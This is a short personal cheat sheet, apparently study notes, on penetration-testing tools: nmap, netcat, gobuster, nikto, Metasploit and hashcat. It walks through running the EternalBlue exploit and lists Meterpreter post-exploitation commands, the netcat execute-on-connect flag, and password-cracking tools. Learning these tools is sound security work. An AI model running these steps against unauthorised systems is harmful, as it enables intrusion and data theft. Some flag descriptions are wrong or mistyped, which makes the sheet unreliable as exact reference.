|Common Exploit Tools and Their Usage - Kyle N Jan 2022|
========================================================

|nmap|
======
Scans a network to detect Services, Ports, OS Versions, and other info. 
    

    |Standard Usage|
    ================
    nmap -sVA = Agressive Scan (takes longer but gathers lots of info)
    nmap -sV = software and versions along with ports (quicker than above)

|netcat|
========
This allows for connection to specified ports, as well as sending data to those ports

    |Standard Usage|
    ================
    ncat -l = list
    ncat -v = verbose
    ncat -p = port specification
    ncat -e = execute program on connect

|gobuster|
==========
Scans for hidden directories and folders based on a wordlist of common directories

    
    |Standard Usage|
    ================
    gobuster 'dir' OR 'dns' = Sets the brute force method. Typically 'dir'
    gobuster -w = specify wordlist to use
    gobuster -x = look for specific file extensions to compare with wordlist
    gobuster -U = specifies username to use
    gobuster -P = specifies password to use
    gobuster -k = skip SSL verification
    
    |Full Command|
    --------------
    gobuster dir -u "IP/URL" -w "wordlist" [additional flags]

|nikto|
=======
Tool that scans websites for common CVE vulnerabilities. Can also grab general information about web server, similar to Nmap but more directed

    |Standard Usage|
    ================
    nikto -h 'hostname' -id 'username/password'

    Can also specify SSL or no SSL, as well as using specified plugins to narrow search


|metasploit|
============
Automatic tool for grabbing CVE's and exploting servers using them. Makes running tools much easier and is widely used rather than running CVE tools separately. 

    |Install & Launch|
    ==================
    Download from:
    https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers

    To use:
    Navigate to /opt/metasplot-framework/bin/msfconsole or type msfconsole in terminal
    
    |Standard Usage|
    ================
    Find Modules to Use: 'search X' where X is the module name
    Select Module: 'use X'
    Info about Module: 'info X'
    Module Options: 'show options' Once module is selected ('show advanced' displays more info)
    


    |Example (eternalblue exploit)|
    -------------------------------
    Step 1: 'search eternalblue' : Find Module Path
    Step 2: 'use exploit/windows/smb/ms17_010_eternalblue' : Select Module
    Step 3: 'show options' : Show Possible CMD Config
    Step 4: 'set RHOST "X"' : Set the CMD options
    Step 5: 'exploit' : After setting options, runs exploit on target specified
    Step 6 (optional): 'exploit -j' : Runs in Background
    Step 7 (optional): 'exploit -i' : Runs in Interactive Shell


        Once the exploit has been run, it should ideally provide a shell or 'meterpreter'. Meterpreter is just Metasploits interactive shell with useful options
        Meterpreter Commands include:
        Download Files from Host: 'download X'
        Upload Files to Host: 'upload X'
        List Processes on Host: 'ps'
        Change Process on Host (for Priv esc): 'migrate'  
        List Files in Current Dir: 'ls'
        Execute Command: 'execute X'
        Start Interactive Shell: 'shell'
        Find Files on Host: 'search'
        'cat' Output of Files: 'cat'
        Send Meterpreter Shell to BG: 'background'

|Hash Cracking|
===============
Hash passwords and usernames are typically stored in Database files. Typically seperated by new lines and may contain 'Salts'. 
'Salts' are effectively RNG's that are concatenated on top of an existing username or password, adding to it's complexity before being run through a hashing algorithm.
'Salts' can be pre-appended and post-appended (placed before or after the user/pw value) which will determine which tool should be used to crack the hash/salt.

    |Popular Tools|
    ===============
    hashcat - Examples show for the purpose of learning, other tools listed below have their own documentation
    johntheripper
    THC Hydra

    |hashcat Examples|
    ------------------
    hashcat operates off of "modes" which specify the type of hash method to use (md5, sha1, etc...)
     Set Mode: 'hashcat -m'
     Set Attack Mode: 'hashcat a'




